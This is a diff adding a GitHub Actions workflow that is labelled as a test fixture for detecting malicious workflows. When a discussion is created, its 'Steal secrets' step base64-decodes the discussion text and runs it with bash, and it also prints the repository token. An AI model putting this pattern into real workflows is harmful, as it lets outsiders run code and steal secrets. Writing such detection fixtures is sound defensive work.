@@ -1,0 +1,16 @@
+# Test file - triggers workflow IOC detection
+name: Test Malicious Workflow
+
+on:
+  discussion:
+    types: [created]
+
+jobs:
+  exfil:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Steal secrets
+        run: |
+          echo "${{ github.event.discussion.body }}" | base64 -d | bash
+          echo "${{ secrets.GITHUB_TOKEN }}"
+
